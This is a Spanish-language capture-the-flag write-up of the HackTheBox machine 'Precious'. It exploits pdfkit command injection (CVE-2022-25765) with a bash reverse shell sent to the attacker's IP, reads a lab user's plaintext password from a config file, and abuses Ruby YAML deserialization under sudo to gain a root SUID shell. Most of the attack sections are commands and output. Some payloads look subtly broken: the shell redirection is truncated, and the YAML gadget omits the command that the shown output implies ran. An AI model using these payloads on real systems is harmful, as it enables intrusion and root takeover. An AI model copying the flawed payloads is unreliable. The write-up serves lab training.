---
category: writeup
platform: HackTheBox
machine_name: Precious
difficulty: "Fácil"
title: "Máquina Precious"
description: "Resolución de la máquina Precious"
tags: ["CVE-2022-25765", "Password gathering", "Deserialization exploitation"]
---

En esta máquina comprometeremos un sitio web vulnerable al CVE-2022-25765, luego encontraremos una contraseña en la carpeta de un usuario y finalmente escalaremos privilegios abusando de la deserialización YAML en un script que podemos ejecutar como root con sudo. Un punto adiccional de esta máquina es que su logo hace referencia a su temática, por que lo poco que toca está en el área del lenguaje de programación Ruby.

<h2>RECONOCIMIENTO</h2>

Como en muchas máquinas, esta solo tiene dos puertos abiertos

{% highlight bash %}
# Nmap 7.93 scan initiated Wed May 17 12:50:15 2023 as: nmap -sS -Pn -p- --open -vvv --min-rate 100 -oN ports 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.27s latency).
Scanned at 2023-05-17 12:50:16 -04 for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed May 17 12:50:16 2023 -- 1 IP address (1 host up) scanned in 0.80 seconds
{% endhighlight %}

El servicio web nos manda al dominio "precious.htb", y es simplemente uno para convertir páginas web a PDF

![Webpage](/assets/writeups/precious/1.png)

No te olvides de agregar el dominio a tu archivo de hosts para poder acceder a la web.

{% highlight bash %}
10.10.11.189 precious.htb
{% endhighlight %}

<h2>INTRUSIÓN</h2>

Si analizamos el PDF que nos da la web con `exiftool` veremos que usa la librería pdfkit para generar el documento.

{% highlight bash %}
❯ exiftool r24pt939pmue2a5sn5x1lsn5n67y3lda.pdf
ExifTool Version Number         : 12.60
File Name                       : r24pt939pmue2a5sn5x1lsn5n67y3lda.pdf
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2023:05:17 13:29:17-04:00
File Access Date/Time           : 2023:05:17 13:29:18-04:00
File Inode Change Date/Time     : 2023:05:17 13:29:31-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
{% endhighlight %}

Esta versión es vulnerable a una inyección de comandos (CVE-2022-25765), podemos colocar algo como esto en la URL que le pasamos al sitio:

{% highlight bash %}
http://10.10.16.8:8000/?thing=#{'%20`whoami`'}
{% endhighlight %}

Vamos a intentar colocarle el típico one liner de bash

{% highlight bash %}
http://10.10.16.8:8000/?thing=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.16.8/443 0>&"`'}
{% endhighlight %}

{% highlight bash %}
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.189 60572
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ruby@precious:/var/www/pdfapp$ ^Z
[1]  + 12712 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 12712 continued  nc -lvnp 443
                                    reset xterm

ruby@precious:/var/www/pdfapp$ export TERM=xterm-256color
ruby@precious:/var/www/pdfapp$ source /etc/skel/.bashrc 
{% endhighlight %}

Ganamos acceso como el usuario ruby, ahora vamos a examinar la máquina... haciéndolo vemos que existe otro usuario llamado "henry" y ruby tiene un directorio personal 

{% highlight bash %}
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 May 17 13:15 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 May 17 13:15 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
{% endhighlight %}

La carpeta .bundle tiene un archivo llamado "config", si lo vemos parece que tiene la contraseña del usuario henry.

{% highlight bash %}
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
{% endhighlight %}

Si intentamos pasarnos a este usuario con `su` nos deja, y podremos ver la primera flag

{% highlight bash %}
ruby@precious:~/.bundle$ su henry
Password: 
henry@precious:/home/ruby/.bundle$ cd
henry@precious:~$ ls -la
total 28
drwxr-xr-x 3 henry henry 4096 May 17 13:42 .
drwxr-xr-x 4 root  root  4096 Oct 26  2022 ..
lrwxrwxrwx 1 root  root     9 Sep 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26  2022 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26  2022 .bashrc
drwxr-xr-x 3 henry henry 4096 May 17 12:07 .local
-rw-r--r-- 1 henry henry  807 Sep 26  2022 .profile
-rw-r----- 1 root  henry   33 May 17 12:03 user.txt
henry@precious:~$ cat user.txt
87edb95fa41bb301b1557bc200******
{% endhighlight %}

<h2>ESCALADA DE PRIVILEGIOS</h2>

Si miramos nuestros privilegios en sudoers encontramos este:

{% highlight bash %}
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
{% endhighlight %}

El script de ruby contiene lo siguiente:

{% highlight ruby %}
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
{% endhighlight %}

Está esperando un fichero YAML llamado "dependencies.yml" para ver si las versiones de las gemas que contiene son diferentes a las que están instaladas en el equipo.

Podemos abusar de este script introduciendo en el YAML un objeto que se va a deserializar, y al hacerlo cargará un archivo de especificación de gemas (gemspec) que ejecutará un comando arbitrario.

{% highlight yaml %}
-- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "test.gemspec"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
{% endhighlight %}

{% highlight bash %}
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
[test.gemspec] isn't a Gem::Specification (Integer instead).
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	19: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	18: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	17: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	16: from /usr/lib/ruby/vendor_ruby/rubygems/dependency_list.rb:99:in `each'
	15: from /usr/lib/ruby/vendor_ruby/rubygems/dependency_list.rb:76:in `dependency_order'
	14: from /usr/lib/ruby/2.7.0/tsort.rb:257:in `strongly_connected_components'
	13: from /usr/lib/ruby/2.7.0/tsort.rb:281:in `strongly_connected_components'
	12: from /usr/lib/ruby/2.7.0/tsort.rb:281:in `to_a'
	11: from /usr/lib/ruby/2.7.0/tsort.rb:281:in `each'
	10: from /usr/lib/ruby/2.7.0/tsort.rb:347:in `each_strongly_connected_component'
	9: from /usr/lib/ruby/2.7.0/tsort.rb:347:in `call'
	8: from /usr/lib/ruby/vendor_ruby/rubygems/dependency_list.rb:214:in `tsort_each_node'
	7: from /usr/lib/ruby/vendor_ruby/rubygems/dependency_list.rb:214:in `each'
	6: from /usr/lib/ruby/2.7.0/tsort.rb:349:in `block in each_strongly_connected_component'
	5: from /usr/lib/ruby/2.7.0/tsort.rb:415:in `each_strongly_connected_component_from'
	4: from /usr/lib/ruby/2.7.0/tsort.rb:415:in `call'
	3: from /usr/lib/ruby/vendor_ruby/rubygems/dependency_list.rb:218:in `tsort_each_child'
	2: from /usr/lib/ruby/vendor_ruby/rubygems/dependency_list.rb:218:in `sort'
	1: from /usr/lib/ruby/vendor_ruby/rubygems/source/specific_file.rb:64:in `<=>'
/usr/lib/ruby/vendor_ruby/rubygems/stub_specification.rb:155:in `name': undefined method `name' for nil:NilClass (NoMethodError)
henry@precious:~$ ls -la /tmp
total 1252
drwxrwxrwt 11 root root    4096 May 17 14:20 .
drwxr-xr-x 18 root root    4096 Nov 21 15:11 ..
-rwsr-xr-x  1 root root 1234376 May 17 14:20 bash
drwxrwxrwt  2 root root    4096 May 17 12:03 .font-unix
drwxrwxrwt  2 root root    4096 May 17 12:03 .ICE-unix
drwxr-xr-x  5 root root    4096 May 17 14:03 passenger.Tw1H7HC
drwx------  2 ruby ruby    4096 May 17 13:15 runtime-ruby
drwx------  3 root root    4096 May 17 12:03 systemd-private-1584d924c9c14f44b62e1b3e9da22add-systemd-logind.service-3pdhSg
drwxrwxrwt  2 root root    4096 May 17 12:03 .Test-unix
drwx------  2 root root    4096 May 17 12:03 vmware-root_390-591434169
drwxrwxrwt  2 root root    4096 May 17 12:03 .X11-unix
drwxrwxrwt  2 root root    4096 May 17 12:03 .XIM-unix
{% endhighlight %}

Tomemos la última flag

{% highlight bash %}
henry@precious:~$ /tmp/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# cat root.txt
39b5757a1e92b69eb505cceafb******
{% endhighlight %}

*Tampoco hay extra esta vez.*